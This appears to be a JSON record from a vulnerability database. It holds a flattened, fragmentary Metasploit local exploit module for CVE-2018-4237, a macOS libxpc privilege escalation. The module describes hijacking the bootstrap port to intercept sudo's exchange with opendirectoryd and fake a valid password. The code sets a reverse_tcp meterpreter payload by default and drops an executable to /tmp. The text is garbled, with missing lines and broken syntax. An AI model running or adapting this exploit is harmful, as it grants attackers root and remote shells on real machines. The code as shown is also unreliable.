{
    "text": "vul_name : Mac OS X libxpc MITM Privilege Escalation ， vul_cve : CVE-2018-4237 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = ExcellentRanking ， include Msf : Post : File ， include Msf : Post : OSX : Priv ， include Msf : Post : OSX : System ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Mac OS X libxpc MITM Privilege Escalation' ,  ， 'Description' => %q{ ， This module exploits a vulnerablity in libxpc on macOS <= 10.13.3 ， The task_set_special_port API allows callers to overwrite their bootstrap port ,  ， which is used to communicate with launchd. This port is inherited across forks :  ， child processes will use the same bootstrap port as the parent. ， By overwriting the bootstrap port and forking a child processes , we can now gain ， a MitM position between our child and launchd. ， To gain root we target the sudo binary and intercept its communication with ， opendirectoryd , which is used by sudo to verify credentials. We modify the ， replies from opendirectoryd to make it look like our password was valid. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [ 'saelo' ]  ,  ， ' ，  [ 'CVE' , '2018-4237' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'Arch' => [ ARCH_X64 ]  ,  ， 'Platform' => 'osx' ,  ， 'DefaultTarget' => 0 ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'osx/x64/meterpreter/reverse_tcp' } ,  ， 'Targets' => [  ，  [ 'Mac OS X x64 ( Native Payload ) ' , { } ]  ，  ]  ,  ， 'DisclosureDate' => 'Mar 15 2018' )  ， register_advanced_options [  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  ， end ， print_status ( \"Uploading file : ' # {filepath}'\" )  ， write_file ( filepath , filedata )  ， chmod ( filepath )  ， register_file_for_cleanup ( filepath )  ， end ， def check ， version = Gem : Version.new ( get_system_version ) ",
    "time": "2018.11.29"
}